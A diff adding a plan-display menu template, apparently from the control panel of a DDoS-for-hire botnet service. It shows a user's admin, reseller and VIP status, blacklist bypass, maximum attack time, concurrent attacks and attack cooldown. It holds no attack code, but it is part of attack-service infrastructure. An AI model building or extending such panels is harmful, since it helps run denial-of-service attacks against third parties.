@@ -1,0 +1,19 @@
+name=plan
+description=Shows your current plan!
+admin=false
+reseller=false
+vip=false
+================== MENU SPLIT DONE ==================
+
+用户名: <<$username>>
+管理权限: <<$admin>>
+代理权限: <<$reseller>>
+VIP Plan: <<$vip>>
+封禁状态: <<$banned>>
+Bypass Blacklist: <<$bypassblacklist>>
+最大攻击时间: [38;5;11m<<$maxtime>>[0m
+同时攻击数量: [38;5;11m<<$concurrents>>[0m
+Max Sessions: [38;5;11m<<$maxsessions>>[0m
+剩余使用天数: [38;5;11m<<$days_left>>[0m天
+剩余攻击时间: [38;5;11m<<$cooldown>>[0m秒
+
